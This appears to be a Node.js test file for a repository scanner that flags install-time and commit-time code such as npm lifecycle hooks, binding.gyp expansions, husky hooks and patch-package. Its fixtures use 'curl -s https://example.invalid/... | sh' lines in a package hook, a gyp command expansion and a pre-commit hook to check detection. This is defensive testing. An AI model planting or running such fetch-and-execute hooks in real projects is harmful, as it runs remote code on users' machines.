// Review rules WR-03 / WR-04: install-time and commit-time code outside package.json scripts (in memory only).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { runRules } from '../skills/repoflags/scripts/lib/rules/index.mjs';
import { selectKind } from '../skills/repoflags/scripts/lib/acquire/select.mjs';
import { pkg } from './fixtures/lifecycle-cases.mjs';

const run = (map) => runRules(new Map(Object.entries(map).map(([k, v]) => [k, { text: v, size: v.length }])), { options: {}, addSecret() {} });
const life = (r) => r.signals.filter((s) => s.rule === 'lifecycle-script');

test('WR-04: dependencies and pnpm:devPreinstall hooks are reported', () => {
  for (const hook of ['dependencies', 'pnpm:devPreinstall']) {
    const s = life(run({ 'package.json': pkg({ [hook]: 'curl -s https://example.invalid/x | sh' }) }));
    assert.equal(s.length, 1, hook);
    assert.equal(s[0].severity, 'high', hook);
  }
});

test('WR-04: the dependencies hook is located on its scripts line, not on the dependencies section', () => {
  const text = JSON.stringify({ dependencies: { a: '1.0.0' }, scripts: { dependencies: 'node x.js' } }, null, 2);
  const s = life(run({ 'package.json': text }));
  assert.equal(s[0].line, 6);
});

test('WR-04: binding.gyp is selected; it is medium, high with a command expansion, quiet with gypfile false', () => {
  assert.equal(selectKind('native/binding.gyp'), 'gyp');
  const plain = life(run({ 'package.json': pkg({}), 'binding.gyp': "{ 'targets': [ { 'target_name': 'x' } ] }" }));
  assert.equal(plain.length, 1);
  assert.equal(plain[0].severity, 'medium');
  const expand = life(run({ 'package.json': pkg({}), 'binding.gyp': "{ 'variables': { 'v': '<!(curl -s https://example.invalid/g | sh)' } }" }));
  assert.equal(expand[0].severity, 'high');
  const off = life(run({ 'package.json': JSON.stringify({ name: 'x', gypfile: false }), 'binding.gyp': '{}' }));
  assert.deepEqual(off, []);
});

test('WR-03: node-gyp rebuild is no longer allowlisted', () => {
  const s = life(run({ 'package.json': pkg({ install: 'node-gyp rebuild' }) }));
  assert.equal(s[0].severity, 'medium');
});

test('WR-03: a husky hook with a suspicious command is high', () => {
  const r = run({ 'package.json': pkg({ prepare: 'husky' }), '.husky/pre-commit': 'npx lint-staged\ncurl -s https://example.invalid/h | sh\n' });
  const hook = life(r).find((s) => s.file === '.husky/pre-commit');
  assert.ok(hook, JSON.stringify(r.signals));
  assert.equal(hook.severity, 'high');
  assert.equal(hook.line, 2);
});

test('WR-03: patch-package with patches in the repository is medium and lists the patched packages', () => {
  assert.equal(selectKind('patches/tailwindcss+3.4.1.patch'), 'patch');
  const r = run({ 'package.json': pkg({ postinstall: 'patch-package' }), 'patches/tailwindcss+3.4.1.patch': 'diff', 'patches/@scope+pkg+1.0.0.patch': 'diff' });
  const s = life(r).find((x) => x.severity === 'medium');
  assert.ok(s, JSON.stringify(r.signals));
  assert.ok(s.evidence.includes('tailwindcss') && s.evidence.includes('@scope/pkg'), s.evidence);
});
